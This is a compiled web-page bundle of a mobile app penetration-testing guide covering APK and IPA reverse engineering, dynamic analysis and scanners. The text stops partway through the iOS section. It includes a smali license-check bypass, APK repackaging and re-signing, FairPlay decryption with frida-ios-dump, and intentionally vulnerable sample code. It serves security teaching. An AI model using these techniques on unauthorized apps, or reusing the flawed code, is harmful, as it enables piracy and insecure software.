"use strict";(globalThis.webpackChunkgl_0_bal_01=globalThis.webpackChunkgl_0_bal_01||[]).push([[7423],{4381:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>o,contentTitle:()=>l,default:()=>p,frontMatter:()=>a,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"Security/Pentesting/sop-mobile-security","title":"Mobile Security (iOS & Android)","description":"Comprehensive mobile app testing: iOS/Android reverse engineering, runtime analysis, SSL pinning bypass & vulnerability exploitation techniques.","source":"@site/intel-codex/Security/Pentesting/sop-mobile-security.md","sourceDirName":"Security/Pentesting","slug":"/Security/Pentesting/sop-mobile-security","permalink":"/intel-codex/Security/Pentesting/sop-mobile-security","draft":false,"unlisted":false,"editUrl":"https://github.com/gl0bal01/intel-codex/tree/main/intel-codex/Security/Pentesting/sop-mobile-security.md","tags":[],"version":"current","lastUpdatedAt":null,"frontMatter":{"type":"sop","title":"Mobile Security (iOS & Android)","description":"Comprehensive mobile app testing: iOS/Android reverse engineering, runtime analysis, SSL pinning bypass & vulnerability exploitation techniques.","created":"2024-02-02T00:00:00.000Z"},"sidebar":"intelCodexSidebar","previous":{"title":"Linux Pentesting SOP (Authorized)","permalink":"/intel-codex/Security/Pentesting/sop-linux-pentest"},"next":{"title":"Vulnerability Research SOP","permalink":"/intel-codex/Security/Pentesting/sop-vulnerability-research"}}');var r=i(74848),t=i(28453);const a={type:"sop",title:"Mobile Security (iOS & Android)",description:"Comprehensive mobile app testing: iOS/Android reverse engineering, runtime analysis, SSL pinning bypass & vulnerability exploitation techniques.",created:new Date("2024-02-02T00:00:00.000Z")},l="Mobile Security (iOS & Android)",o={},c=[{value:"Table of Contents",id:"table-of-contents",level:2},{value:"Overview",id:"overview",level:2},{value:"Mobile Security Testing Scope",id:"mobile-security-testing-scope",level:3},{value:"Testing Environments",id:"testing-environments",level:3},{value:"Legal &amp; Ethical Considerations",id:"legal--ethical-considerations",level:3},{value:"Android Security Testing",id:"android-security-testing",level:2},{value:"Android Application Structure",id:"android-application-structure",level:3},{value:"Android Reverse Engineering",id:"android-reverse-engineering",level:3},{value:"Android Dynamic Analysis",id:"android-dynamic-analysis",level:3},{value:"Android Static Analysis (Automated)",id:"android-static-analysis-automated",level:3},{value:"Android Native Library Analysis",id:"android-native-library-analysis",level:3},{value:"Modifying &amp; Repackaging APKs",id:"modifying--repackaging-apks",level:3},{value:"iOS Security Testing",id:"ios-security-testing",level:2},{value:"iOS Application Structure",id:"ios-application-structure",level:3},{value:"iOS Reverse Engineering",id:"ios-reverse-engineering",level:3},{value:"iOS Dynamic Analysis",id:"ios-dynamic-analysis",level:3},{value:"iOS Static Analysis (Automated)",id:"ios-static-analysis-automated",level:3},{value:"Common Mobile Vulnerabilities",id:"common-mobile-vulnerabilities",level:2},{value:"Insecure Data Storage",id:"insecure-data-storage",level:3},{value:"Insecure Communication",id:"insecure-communication",level:3},{value:"Hardcoded Secrets",id:"hardcoded-secrets",level:3},{value:"Weak Cryptography",id:"weak-cryptography",level:3},{value:"SQL Injection (Mobile)",id:"sql-injection-mobile",level:3},{value:"Intent Hijacking (Android)",id:"intent-hijacking-android",level:3},{value:"Network Analysis",id:"network-analysis",level:2},{value:"HTTPS Interception (MITM Proxy)",id:"https-interception-mitm-proxy",level:3},{value:"Bypassing Certificate Pinning",id:"bypassing-certificate-pinning",level:3},{value:"Dynamic Instrumentation",id:"dynamic-instrumentation",level:2},{value:"Frida Basics",id:"frida-basics",level:3},{value:"Frida Scripting Examples",id:"frida-scripting-examples",level:3},{value:"Objection (Frida REPL)",id:"objection-frida-repl",level:3},{value:"Bypassing Security Controls",id:"bypassing-security-controls",level:2},{value:"Root/Jailbreak Detection Bypass",id:"rootjailbreak-detection-bypass",level:3},{value:"Debugger Detection Bypass",id:"debugger-detection-bypass",level:3},{value:"Emulator/Simulator Detection Bypass",id:"emulatorsimulator-detection-bypass",level:3},{value:"Automated Testing",id:"automated-testing",level:2},{value:"Mobile App Scanners",id:"mobile-app-scanners",level:3},{value:"Automated Fuzzing",id:"automated-fuzzing",level:3},{value:"Tools Reference",id:"tools-reference",level:2},{value:"Android Tools",id:"android-tools",level:3},{value:"iOS Tools",id:"ios-tools",level:3},{value:"Multi-Platform Tools",id:"multi-platform-tools",level:3},{value:"Learning Resources",id:"learning-resources",level:2},{value:"Documentation",id:"documentation",level:3},{value:"Books",id:"books",level:3},{value:"Online Courses",id:"online-courses",level:3},{value:"Practice Apps",id:"practice-apps",level:3},{value:"Related SOPs",id:"related-sops",level:2}];function d(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",mdxAdmonitionTitle:"mdxAdmonitionTitle",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsxs)(n.admonition,{type:"danger",children:[(0,r.jsxs)(n.mdxAdmonitionTitle,{children:["Synced from an ",(0,r.jsx)(n.strong,{children:"Obsidian vault"})]}),(0,r.jsxs)(n.p,{children:["For graph and advanced features, download the ",(0,r.jsx)(n.strong,{children:"full"})," ",(0,r.jsx)(n.strong,{children:(0,r.jsx)(n.a,{href:"https://github.com/gl0bal01/intel-codex",children:"Intel Codex Vault"})})," and open it in ",(0,r.jsx)(n.strong,{children:"Obsidian"}),"."]})]}),"\n",(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"mobile-security-ios--android",children:"Mobile Security (iOS & Android)"})}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Purpose:"})," Comprehensive guide to mobile application security testing, reverse engineering, and exploitation for iOS and Android platforms."]}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"table-of-contents",children:"Table of Contents"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#overview",children:"Overview"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#android-security-testing",children:"Android Security Testing"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#ios-security-testing",children:"iOS Security Testing"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#common-mobile-vulnerabilities",children:"Common Mobile Vulnerabilities"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#network-analysis",children:"Network Analysis"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#dynamic-instrumentation",children:"Dynamic Instrumentation"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#bypassing-security-controls",children:"Bypassing Security Controls"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#automated-testing",children:"Automated Testing"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#tools-reference",children:"Tools Reference"})}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"overview",children:"Overview"}),"\n",(0,r.jsx)(n.h3,{id:"mobile-security-testing-scope",children:"Mobile Security Testing Scope"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Key areas:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"App reverse engineering:"})," Decompile, analyze code, find vulnerabilities"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Runtime analysis:"})," Hook functions, modify behavior, bypass protections"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Network security:"})," HTTPS interception, API security, certificate pinning bypass"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Data storage:"})," Analyze local databases, shared preferences, keychains"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Authentication/authorization:"})," Session management, token security"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Cryptography:"})," Weak algorithms, hardcoded keys, insecure random number generation"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Platform-specific:"})," Android intents, iOS URL schemes, deep linking"]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"testing-environments",children:"Testing Environments"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Android:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Emulator:"})," Android Studio AVD (x86/x64, faster)"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Physical device:"})," Rooted Android phone (Pixel, OnePlus recommended)"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"OS version:"})," Test on multiple Android versions (8.0+)"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"iOS:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Simulator:"})," Xcode Simulator (limited - no hardware features)"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Physical device:"})," Jailbroken iPhone (iOS 14-16)"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"OS version:"})," Test on current and previous iOS versions"]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"legal--ethical-considerations",children:"Legal & Ethical Considerations"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Authorized testing only:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u2705 Test apps you developed or have permission to test"}),"\n",(0,r.jsx)(n.li,{children:"\u2705 Bug bounty programs (HackerOne, Bugcrowd)"}),"\n",(0,r.jsx)(n.li,{children:"\u2705 Penetration testing engagements with signed contracts"}),"\n",(0,r.jsx)(n.li,{children:"\u274c Reverse engineering apps without authorization (may violate TOS)"}),"\n",(0,r.jsx)(n.li,{children:"\u274c Circumventing DRM or software protection for piracy"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Responsible disclosure:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Report vulnerabilities to app developers/vendors"}),"\n",(0,r.jsx)(n.li,{children:"Allow 90 days for remediation before public disclosure"}),"\n",(0,r.jsx)(n.li,{children:"Use CVE process for significant vulnerabilities"}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"android-security-testing",children:"Android Security Testing"}),"\n",(0,r.jsx)(n.h3,{id:"android-application-structure",children:"Android Application Structure"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"APK (Android Package) contents:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"app.apk (ZIP file)\n\u2502\n\u251c\u2500\u2500 AndroidManifest.xml       # App metadata, permissions, components\n\u251c\u2500\u2500 classes.dex                # Dalvik bytecode (compiled Java/Kotlin)\n\u251c\u2500\u2500 resources.arsc             # Compiled resources\n\u251c\u2500\u2500 res/                       # Resources (images, layouts, strings)\n\u2502   \u251c\u2500\u2500 drawable/\n\u2502   \u251c\u2500\u2500 layout/\n\u2502   \u2514\u2500\u2500 values/\n\u251c\u2500\u2500 lib/                       # Native libraries (.so files)\n\u2502   \u251c\u2500\u2500 armeabi-v7a/\n\u2502   \u251c\u2500\u2500 arm64-v8a/\n\u2502   \u251c\u2500\u2500 x86/\n\u2502   \u2514\u2500\u2500 x86_64/\n\u251c\u2500\u2500 assets/                    # Raw asset files\n\u251c\u2500\u2500 META-INF/                  # APK signature\n\u2502   \u251c\u2500\u2500 MANIFEST.MF\n\u2502   \u251c\u2500\u2500 CERT.RSA\n\u2502   \u2514\u2500\u2500 CERT.SF\n\u2514\u2500\u2500 kotlin/                    # Kotlin metadata (if Kotlin app)\n"})}),"\n",(0,r.jsx)(n.h3,{id:"android-reverse-engineering",children:"Android Reverse Engineering"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 1: Obtain APK"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Method 1: Download from device (requires adb)\nadb shell pm list packages | grep &lt;app_name&gt;\n# Output: package:com.example.app\n\nadb shell pm path com.example.app\n# Output: package:/data/app/com.example.app-xxx/base.apk\n\nadb pull /data/app/com.example.app-xxx/base.apk app.apk\n\n# Method 2: Download from APK mirror sites\n# APKMirror, APKPure, APKMonk (verify integrity!)\n\n# Method 3: Extract from app store (requires tools)\n# Use gplaycli or APKUpdater\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 2: Decompile APK with JADX"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install JADX:\n# https://github.com/skylot/jadx/releases\n\n# Decompile APK to Java source:\njadx app.apk -d output_dir/\n\n# Output structure:\n# output_dir/\n#   \u251c\u2500\u2500 sources/              # Decompiled Java code\n#   \u2502   \u2514\u2500\u2500 com/example/app/\n#   \u2502       \u251c\u2500\u2500 MainActivity.java\n#   \u2502       \u251c\u2500\u2500 LoginActivity.java\n#   \u2502       \u2514\u2500\u2500 utils/\n#   \u251c\u2500\u2500 resources/            # Decoded resources\n#   \u2514\u2500\u2500 AndroidManifest.xml\n\n# Or use JADX-GUI:\njadx-gui app.apk\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 3: Analyze decompiled code"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'// Example: LoginActivity.java (decompiled)\npublic class LoginActivity extends AppCompatActivity {\n    private static final String API_KEY = "sk_live_abc123xyz";  // Hardcoded API key!\n\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_login);\n    }\n\n    public void loginUser(String username, String password) {\n        // Vulnerable: No input validation\n        String query = "SELECT * FROM users WHERE username=\'" + username + "\'";  // SQL injection!\n\n        // Insecure: HTTP instead of HTTPS\n        String url = "http://api.example.com/login";  // Cleartext transmission!\n\n        // Weak crypto: MD5 for password hashing\n        String hashedPassword = MD5(password);  // MD5 is broken!\n    }\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 4: Decode with Apktool (for resources and smali)"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install Apktool:\n# https://ibotpeaches.github.io/Apktool/\n\n# Decode APK:\napktool d app.apk -o app_decoded/\n\n# Output structure:\n# app_decoded/\n#   \u251c\u2500\u2500 AndroidManifest.xml   # Decoded manifest (readable XML)\n#   \u251c\u2500\u2500 smali/                 # Dalvik assembly code\n#   \u2502   \u2514\u2500\u2500 com/example/app/\n#   \u2502       \u251c\u2500\u2500 MainActivity.smali\n#   \u2502       \u2514\u2500\u2500 LoginActivity.smali\n#   \u251c\u2500\u2500 res/                   # Decoded resources\n#   \u2502   \u251c\u2500\u2500 layout/\n#   \u2502   \u251c\u2500\u2500 values/\n#   \u2502   \u2502   \u2514\u2500\u2500 strings.xml    # App strings\n#   \u2514\u2500\u2500 original/              # Original files\n\n# Analyze resources:\ncat app_decoded/res/values/strings.xml\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 5: Analyze AndroidManifest.xml"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="utf-8"?>\n<manifest xmlns:android="http://schemas.android.com/apk/res/android"\n    package="com.example.app">\n\n    \x3c!-- Permissions (check for excessive permissions) --\x3e\n    <uses-permission android:name="android.permission.INTERNET" />\n    <uses-permission android:name="android.permission.READ_CONTACTS" />  \x3c!-- Suspicious! --\x3e\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />\n\n    \x3c!-- Exported components (vulnerable if not protected) --\x3e\n    <activity android:name=".MainActivity"\n        android:exported="true">  \x3c!-- Exported = accessible by other apps! --\x3e\n        <intent-filter>\n            <action android:name="android.intent.action.MAIN" />\n            <category android:name="android.intent.category.LAUNCHER" />\n        </intent-filter>\n    </activity>\n\n    \x3c!-- Debuggable flag (should be false in production) --\x3e\n    <application\n        android:debuggable="true"  \x3c!-- VULNERABLE! Allows debugging --\x3e\n        android:allowBackup="true"  \x3c!-- Data can be backed up --\x3e\n        android:networkSecurityConfig="@xml/network_security_config">\n        ...\n    </application>\n</manifest>\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Key manifest checks:"})}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Check"}),(0,r.jsx)(n.th,{children:"Security Impact"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.code,{children:'android:debuggable="true"'})}),(0,r.jsx)(n.td,{children:"Allows attaching debugger, inspecting memory"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.code,{children:'android:allowBackup="true"'})}),(0,r.jsx)(n.td,{children:"Data can be extracted via adb backup"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.code,{children:'android:exported="true"'})}),(0,r.jsx)(n.td,{children:"Component accessible by other apps (intent hijacking)"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Excessive permissions"}),(0,r.jsx)(n.td,{children:"Privacy violation, larger attack surface"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.code,{children:'android:usesCleartextTraffic="true"'})}),(0,r.jsx)(n.td,{children:"Allows HTTP traffic (MITM risk)"})]})]})]}),"\n",(0,r.jsx)(n.h3,{id:"android-dynamic-analysis",children:"Android Dynamic Analysis"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 1: Set up testing device"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Enable Developer Options on Android device:\n# Settings \u2192 About Phone \u2192 Tap "Build number" 7 times\n\n# Enable USB debugging:\n# Settings \u2192 Developer Options \u2192 USB debugging (ON)\n\n# Connect device via USB:\nadb devices\n# Output: List of devices attached\n#         ABC123XYZ    device\n\n# Root device (if not rooted):\n# Use Magisk: https://github.com/topjohnwu/Magisk\n# Flash Magisk via custom recovery (TWRP)\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 2: Install app"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install APK:\nadb install app.apk\n\n# Or install from device:\nadb shell pm install /sdcard/app.apk\n\n# Verify installation:\nadb shell pm list packages | grep com.example.app\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 3: Explore app filesystem"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# App data directory (requires root):\nadb shell\nsu  # Switch to root\ncd /data/data/com.example.app/\n\n# Directory structure:\n# /data/data/com.example.app/\n#   \u251c\u2500\u2500 cache/                 # Cached data\n#   \u251c\u2500\u2500 databases/             # SQLite databases\n#   \u2502   \u2514\u2500\u2500 app.db\n#   \u251c\u2500\u2500 shared_prefs/          # SharedPreferences (XML)\n#   \u2502   \u2514\u2500\u2500 settings.xml\n#   \u251c\u2500\u2500 files/                 # App files\n#   \u2514\u2500\u2500 lib/                   # Native libraries\n\n# Check for sensitive data:\ncat shared_prefs/settings.xml\n# Example:\n# <string name="api_token">eyJhbGciOiJIUzI1...</string>  # Stored token!\n\ncat databases/app.db\n# Or use sqlite3:\nsqlite3 databases/app.db\nsqlite> .tables\nsqlite> SELECT * FROM users;\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 4: Monitor logcat (logs)"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# View real-time logs:\nadb logcat | grep com.example.app\n\n# Common log leaks:\n# - API keys, tokens\n# - Passwords (if logged during debugging)\n# - Sensitive user data (PII)\n\n# Example log:\n# D/LoginActivity: Logging in user: john@example.com with password: password123\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 5: Intercept network traffic (see Network Analysis section)"})}),"\n",(0,r.jsx)(n.h3,{id:"android-static-analysis-automated",children:"Android Static Analysis (Automated)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"MobSF (Mobile Security Framework):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install MobSF (Docker):\ndocker pull opensecurity/mobile-security-framework-mobsf\ndocker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest\n\n# Access: http://localhost:8000\n\n# Upload APK \u2192 Automated scan:\n# - Permissions analysis\n# - Manifest security checks\n# - Code analysis (hardcoded secrets, SQL injection, etc.)\n# - Binary analysis\n# - Report generation (PDF)\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"AndroBugs:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install AndroBugs:\ngit clone https://github.com/AndroBugs/AndroBugs_Framework.git\ncd AndroBugs_Framework\n\n# Run analysis:\npython androbugs.py -f app.apk\n\n# Output: Detailed report (vulnerabilities, security misconfigurations)\n"})}),"\n",(0,r.jsx)(n.h3,{id:"android-native-library-analysis",children:"Android Native Library Analysis"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Analyzing .so files (ARM/x86 native libraries):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Extract native library from APK:\nunzip app.apk "lib/arm64-v8a/*" -d lib_extracted/\n\n# Analyze with Ghidra:\n# File \u2192 Import File \u2192 lib_extracted/lib/arm64-v8a/libnative.so\n# Analyze with ARM:LE:64:v8A processor\n\n# Look for:\n# - Hardcoded strings (encryption keys, API endpoints)\n# - JNI functions (Java Native Interface bridges)\n# - Crypto implementations (custom or weak crypto)\n# - Anti-tampering checks\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"JNI (Java Native Interface) reversing:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'// Java side (loads native library):\npublic class NativeLib {\n    static {\n        System.loadLibrary("native");  // Loads libnative.so\n    }\n\n    // Native method declaration:\n    public native String decrypt(String encrypted);\n}\n'})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'// Native side (C/C++ in libnative.so):\n#include <jni.h>\n\nJNIEXPORT jstring JNICALL\nJava_com_example_app_NativeLib_decrypt(JNIEnv *env, jobject thiz, jstring encrypted) {\n    const char *enc_str = (*env)->GetStringUTFChars(env, encrypted, 0);\n\n    // Hardcoded AES key (vulnerable!):\n    char aes_key[] = "0123456789ABCDEF0123456789ABCDEF";\n\n    // Decrypt with AES...\n    char *decrypted = aes_decrypt(enc_str, aes_key);\n\n    return (*env)->NewStringUTF(env, decrypted);\n}\n'})}),"\n",(0,r.jsx)(n.h3,{id:"modifying--repackaging-apks",children:"Modifying & Repackaging APKs"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 1: Decompile with Apktool"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"apktool d app.apk -o app_decoded/\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 2: Modify smali code"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-smali",children:"# Edit app_decoded/smali/com/example/app/LoginActivity.smali\n\n# Original (license check):\n.method public checkLicense()Z\n    # ... license validation code ...\n    const/4 v0, 0x0        # Return false (invalid)\n    return v0\n.end method\n\n# Modified (bypass license check):\n.method public checkLicense()Z\n    const/4 v0, 0x1        # Always return true (valid)\n    return v0\n.end method\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 3: Rebuild APK"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"apktool b app_decoded/ -o app_modified.apk\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 4: Sign APK (required for installation)"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Generate keystore (one-time):\nkeytool -genkey -v -keystore my.keystore -alias mykey -keyalg RSA -keysize 2048 -validity 10000\n\n# Sign APK:\njarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my.keystore app_modified.apk mykey\n\n# Align APK (optimization):\nzipalign -v 4 app_modified.apk app_final.apk\n\n# Install:\nadb install app_final.apk\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"ios-security-testing",children:"iOS Security Testing"}),"\n",(0,r.jsx)(n.h3,{id:"ios-application-structure",children:"iOS Application Structure"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"IPA (iOS App Store Package) contents:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"app.ipa (ZIP file)\n\u2502\n\u2514\u2500\u2500 Payload/\n    \u2514\u2500\u2500 App.app/\n        \u251c\u2500\u2500 Info.plist         # App metadata, bundle ID, permissions\n        \u251c\u2500\u2500 App (Mach-O binary)  # Main executable (ARM64)\n        \u251c\u2500\u2500 embedded.mobileprovision  # Provisioning profile\n        \u251c\u2500\u2500 _CodeSignature/    # Code signature\n        \u251c\u2500\u2500 Frameworks/        # Embedded frameworks\n        \u251c\u2500\u2500 Assets.car         # Compiled assets\n        \u2514\u2500\u2500 Base.lproj/        # Localized resources\n"})}),"\n",(0,r.jsx)(n.h3,{id:"ios-reverse-engineering",children:"iOS Reverse Engineering"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 1: Obtain IPA"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Method 1: Download from jailbroken device (requires Frida or SSH)\n# SSH into device:\nssh root@&lt;device_ip&gt;  # Default password: alpine (change it!)\n\n# Locate app:\nfind /var/containers/Bundle/Application/ -name "*.app"\n\n# Copy IPA:\nscp -r root@&lt;device_ip&gt;:/var/containers/Bundle/Application/XXX/App.app ~/Desktop/\n\n# Method 2: Decrypt from App Store (requires jailbroken device)\n# Apps downloaded from App Store are encrypted (FairPlay DRM)\n# Use frida-ios-dump or Clutch to decrypt:\n\n# frida-ios-dump:\ngit clone https://github.com/AloneMonkey/frida-ios-dump.git\ncd frida-ios-dump\npip3 install -r requirements.txt\n\n# Configure device IP in dump.py\npython3 dump.py &lt;bundle_id&gt;\n# Example: python3 dump.py com.example.app\n# Output: Decrypted IPA saved to current directory\n\n# Method 3: Download from third-party sites (verify integrity!)\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 2: Analyze with Hopper/Ghidra"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Extract IPA:\nunzip app.ipa\n\n# Analyze main binary:\n# Payload/App.app/App (Mach-O ARM64 binary)\n\n# Ghidra:\n# File \u2192 Import File \u2192 Payload/App.app/App\n# Analyze with AARCH64:LE:64:AppleSilicon processor\n\n# Hopper (macOS/Linux):\nhopper -e Payload/App.app/App\n\n# IDA Pro (commercial):\nida64 Payload/App.app/App\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 3: Class dump (Objective-C apps)"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install class-dump:\n# https://github.com/nygard/class-dump\n\n# Dump Objective-C class headers:\nclass-dump Payload/App.app/App -H -o headers/\n\n# Output: Objective-C headers (.h files)\n# headers/\n#   \u251c\u2500\u2500 AppDelegate.h\n#   \u251c\u2500\u2500 LoginViewController.h\n#   \u2514\u2500\u2500 APIManager.h\n\n# Example header:\n# @interface LoginViewController : UIViewController\n# - (void)loginWithUsername:(NSString *)username password:(NSString *)password;\n# - (BOOL)validateLicense:(NSString *)license;\n# @end\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Step 4: Analyze Info.plist"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# View Info.plist:\nplutil -p Payload/App.app/Info.plist\n\n# Or convert to XML:\nplutil -convert xml1 Payload/App.app/Info.plist -o Info_readable.plist\n\n# Key checks:\n# - CFBundleIdentifier: 